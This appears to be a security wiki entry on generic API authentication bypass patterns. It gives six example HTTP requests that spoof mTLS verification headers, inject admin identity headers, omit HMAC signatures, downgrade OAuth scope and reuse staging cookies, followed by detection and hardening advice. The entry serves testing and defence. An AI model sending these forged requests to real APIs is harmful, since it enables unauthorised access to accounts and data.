---
title: Generic API Authentication Bypass Patterns
slug: api-authentication-attacks
---

> **TL;DR:** Beyond JWT tricks, APIs leak access through query-string keys, missing HMAC signatures, OAuth scope downgrades, mTLS terminated at the wrong hop, and trusted internal headers that the edge forgets to strip.

## What it is
Authentication on modern APIs is a stack: TLS or mTLS at the edge, a token or key in a header, sometimes a signed request body, and an authorisation decision keyed off claims or scopes. Each layer has a default-insecure mode. This note collects the recurring bypass classes that are protocol-agnostic — they apply to REST, GraphQL, and RPC alike — and that are not specific to JWT cryptography.

## Preconditions / where it applies
- API uses key/header/signature/mTLS auth (any combination)
- There is at least one proxy, gateway, or load balancer in front of the origin
- You can observe at least one valid authenticated request to model the scheme

## Technique
Probe each layer independently.

```http
### 1. API key in URL — replays via referer, logs, caches
GET /v1/orders?api_key=AKIA...PUBLIC HTTP/1.1
Host: api.target.tld

### 2. HMAC signature absence — server falls back to "unsigned trusted"
POST /v1/transfer HTTP/1.1
Host: api.target.tld
Authorization: Bearer eyJ...
# X-Signature header simply omitted; some SDKs treat missing sig as legacy client

### 3. OAuth scope downgrade — request a narrower scope, hope checks are coarse
POST /oauth/token HTTP/1.1
grant_type=refresh_token&refresh_token=...&scope=read

### 4. mTLS bypass via L7 proxy that re-originates TLS
GET /internal/admin HTTP/1.1
Host: api.target.tld
X-SSL-Client-Verify: SUCCESS
X-SSL-Client-S-DN: CN=admin,O=Corp

### 5. Header allowlist confidence — origin trusts injected identity headers
GET /v1/me HTTP/1.1
Host: api.target.tld
X-Authenticated-User: admin@target.tld
X-Forwarded-User: admin

### 6. Cookie scope confusion — staging cookie accepted on prod subdomain
GET /v1/me HTTP/1.1
Host: api.target.tld
Cookie: session=<value-from-staging.target.tld>; Domain=.target.tld
```

Vary one variable at a time, diff the response against a known-good baseline, and watch for 200 with privileged data or 5xx that leak stack traces revealing the auth library.

## Detection and defence
- Defender signals: same key seen from many ASNs, requests missing expected signed headers, traffic with `X-Forwarded-User` / `X-SSL-Client-*` arriving from outside the trusted ingress, scope downgrades followed by privileged calls
- Hardening: never accept secrets in URLs, require and verify HMAC on the origin not the gateway, scope-check on every resource access not just at issuance, terminate mTLS at the origin or sign the client cert chain into a downstream JWT, strip and re-inject identity headers at the edge, set strict cookie `Domain` and `__Host-` prefixes

## References
- [OWASP API2:2023 Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/) — root taxonomy
- [RFC 8725 JWT BCP](https://www.rfc-editor.org/rfc/rfc8725) — applies to bearer pipelines more broadly
- [Google Cloud mTLS guidance](https://cloud.google.com/load-balancing/docs/mtls) — how edge-terminated mTLS leaks identity headers

See also: [[jwt-key-confusion]], [[jwt-jku-jwk-injection]], [[bfla]], [[bola]].
